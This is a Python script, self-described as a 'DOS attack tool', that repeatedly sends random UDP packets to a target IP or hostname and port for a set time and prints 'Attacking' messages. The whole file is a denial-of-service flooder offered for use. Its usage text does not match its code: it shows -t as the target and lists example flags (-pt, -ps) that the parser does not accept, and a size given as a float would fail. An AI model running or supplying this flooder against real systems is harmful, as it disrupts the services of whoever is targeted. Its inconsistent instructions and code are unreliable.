import socket
import sys
import getopt
import threading
import subprocess
import time
import random

url=""
ip=""
timeout=30
petitionTime=10
petitionSize=10
port=4096

def usage():
    print("DOS attack tool")
    print()
    print("Usage: dos.py -t target_host -p port")
    print("-u --url                   -enter url")
    print("-i --target_ip              -enter target ip")
    print("-o --timeout                 -enter timeout")
    print("-t --petition_time          -insert petition time")
    print("-s --petition_size          -insert petition size")
    print("-p --port                    -insert target port")
    print("-h --help                    -show info")
    print()
    print()
    print("Examples:")
    print("python3 dos.py -t 192.168.0.1 -p 5555 -pt 1000")
    print("python3 dos.py -t 192.168.0.1 -p 5555 -ps 100")
    sys.exit(0)

def main():
    global url
    global ip
    global timeout
    global petitionTime
    global petitionSize
    global port

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args=getopt.getopt(sys.argv[1:],"hu:i:o:t:s:p:",["help","url=","target_ip=","timeout=","petition_time=","petition_size=","port="])
    except getopt.GetoptError as err:
        print(str(err))
        print("Please check you are entering correctly the parameters")
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
            # print("you printed -h")
        elif o in ("-u","--url"):
            ip=socket.gethostbyname(a)
            # print("you printed -url")
        elif o in ("-i","--ip"):
            ip=a
            # print("you printed -ip")
        elif o in ("-o","--timeout"):
            timeout=float(a)
            # print("Timeout=%d"%timeout)
        elif o in ("-t","--petition_time"):
            petitionTime=float(a)
            # print("Petition Time=%d"%petitionTime)
        elif o in ("-s","--petition_size"):
            petitionSize=float(a)
            # print("Petition Size=%d"%petitionSize)
        elif o in ("-p","--port"):
            port=int(a)
            # print("Port=%d"%port)

    client= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet=random._urandom(petitionSize)
    startTime=time.time()
    finalize=startTime+timeout
    count=0

    while 1:
        if time.time()>finalize:
            break
        client.sendto(packet,(ip,port))
        count+=1
        print("%d Attacking %s at the port %s: %s"%(count,ip, str(port),str(time.time())))
        time.sleep(petitionTime)

main()
